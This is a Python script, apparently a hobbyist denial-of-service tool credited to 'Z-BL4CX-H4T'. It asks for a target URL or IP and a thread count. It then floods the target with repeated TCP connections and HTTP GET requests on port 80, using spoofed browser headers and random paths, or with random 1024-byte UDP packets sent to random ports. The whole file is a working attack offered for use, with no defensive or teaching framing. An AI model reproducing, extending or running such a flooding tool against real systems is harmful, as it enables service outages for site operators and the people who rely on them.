import threading
import socket
import random
import time
import colorama
from colorama import Fore, Style

colorama.init()

def get_method_input():

  while True:
    print(Fore.GREEN + "1. Metode HTTP (GET, POST, PUT, DELETE, PATCH)")
    print(Fore.GREEN + "2. Metode L4 (UDP, CRASH, BYPASS)")
    print(Fore.GREEN + "3. Metode L7 (CLOUD FLARE, HTTP-GET, DDOS-ATTACK)")
    choice = input(Fore.RESET + "ENTER CHOICE: ")

    if choice == "1":
      while True:
        method = input(Fore.RESET + "ENTER METHOD HTTP: ")
        if method.upper() in ["GET", "POST", "PUT", "DELETE", "PATCH"]:
          return "HTTP-" + method.upper()
        else:
          print(Fore.RED + "Invalid HTTP method. Please enter one of the following options:")
          print(Fore.RESET + "GET, POST, PUT, DELETE, PATCH")
    elif choice == "2":
      while True:
        method = input(Fore.RESET + "ENTER METHOD L4: ")
        if method.upper() in ["UDP", "CRASH", "BYPASS"]:
          return "L4-" + method.upper()
        else:
          print(Fore.RED + "L4 method is invalid. Please enter one of the following options:")
          print(Fore.RESET + "UDP, CRASH, BYPASS")
    elif choice == "3":
      while True:
        method = input(Fore.RESET + "ENTER METHOD L7: ")
        if method.upper() in ["CLOUD FLARE", "HTTP-GET", "DDOS-ATTACK"]:
          return "L7-" + method.upper()
        else:
          print(Fore.RED + "Method L7 is invalid. Please enter one of the following options:")
          print(Fore.RESET + "CLOUD FLARE, HTTP-GET, DDOS-ATTACK")
    else:
      print(Fore.RED + "Pilihan tidak valid. Silakan masukkan 1, 2, atau 3.")

def get_target_input():
  """
  Get target input (URL or IP address) from user
  """
  while True:
    target = input(Fore.RESET + "ENTER URL / IP ADDRESS: ")
    if target:
      return target
    else:
      print(Fore.RED + "TARGET CANNOT BE EMPTY, PLEASE ENTER URL / IP")

def get_thread_input():
  """
  Get thread count input from user and validate it
  """
  while True:
    try:
      thread_count = int(input(Fore.RESET + "ENTER NUMBER OF THREADS: "))
      if thread_count > 0:
        return thread_count
      else:
        print(Fore.RED + "THE NUMBER OF THREADS MUST BE GREATER THAN 100.")
    except ValueError:
      print(Fore.RED + "THREAD NUMBER MUST BE A NUMBER")

def attack_function(method, target):
  print(Fore.GREEN + f"CARRYING OUT ATTACKS WITH METHOD {method} TO TARGET {target}")
  if method.startswith("HTTP"):
    http_attack(target)
  elif method.startswith("L4"):
    l4_attack(target)
  elif method.startswith("L7"):
    l7_attack(target)

def http_attack(target):
  """Performing an HTTP flood attack."""
  try:
    while True:
      headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
      }

      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      sock.connect((target, 80))
      sock.send(f"GET / HTTP/1.1\r\n".encode())
      for header, value in headers.items():
        sock.send(f"{header}: {value}\r\n".encode())
      sock.send(b"\r\n")

      time.sleep(random.uniform(0.01, 0.1))
      sock.close()
  except Exception as e:
    print(Fore.RED + f"Error during HTTP attack: {e}")

def l4_attack(target):
  """Performing L4 UDP flood attacks."""
  try:
    while True:
      sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      sock.sendto(random.randbytes(1024), (target, random.randint(1, 65535)))
      time.sleep(random.uniform(0.01, 0.1))
  except Exception as e:
    print(Fore.RED + f"Error during L4 UDP attack: {e}")

def l7_attack(target):
  """Performing a L7 HTTP GET flood attack."""
  try:
    while True:
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      sock.connect((target, 80))
      sock.send(f"GET /{random.randint(1, 100000)} HTTP/1.1\r\n".encode())
      sock.send(f"Host: {target}\r\n".encode())
      sock.send(b"\r\n")
      time.sleep(random.uniform(0.01, 0.1))
      sock.close()
  except Exception as e:
    print(Fore.RED + f"Error during L7 HTTP GET attack: {e}")

print(Fore.GREEN + """
                                                                             
 _____ _____ _____ _____ _____ _____ _____    _____ _____ _____ __    _____ 
|   __|_   _| __  |  _  |   | |   __|   __|  |_   _|     |     |  |  |   __|
|__   | | | |    -|     | | | |  |  |   __|    | | |  |  |  |  |  |__|__   |
|_____| |_| |__|__|__|__|_|___|_____|_____|    |_| |_____|_____|_____|_____|
                                                                            
""")
print(Fore.RESET + "by: [Z-BL4CX-H4T]")
method = get_method_input()
print(Fore.GREEN + f"SELECTED METHOD: {method}")

target = get_target_input()
print(Fore.GREEN + f"TARGETt: {target}")

thread_count = get_thread_input()
print(Fore.GREEN + f"THREAD NUMBER: {thread_count}")

threads = []
for _ in range(thread_count):
  thread = threading.Thread(target=attack_function, args=(method, target))
  threads.append(thread)

for thread in threads:
  thread.start()

for thread in threads:
  thread.join()

print(Fore.CYAN + "ATTACK FINISHED.")
print(Fore.RESET)
